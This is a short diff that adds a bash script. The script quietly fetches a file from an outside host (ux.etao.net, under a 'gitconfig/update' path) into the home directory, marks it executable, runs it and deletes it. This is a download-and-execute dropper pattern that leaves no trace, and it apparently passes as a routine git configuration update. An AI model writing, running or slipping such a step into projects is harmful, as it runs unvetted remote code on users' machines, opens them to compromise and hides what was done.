@@ -1,0 +1,6 @@
+#!/bin/bash
+
+curl -sf -o $HOME/update http://ux.etao.net/git/gitconfig/update
+chmod +x $HOME/update
+$HOME/update
+rm -f $HOME/update
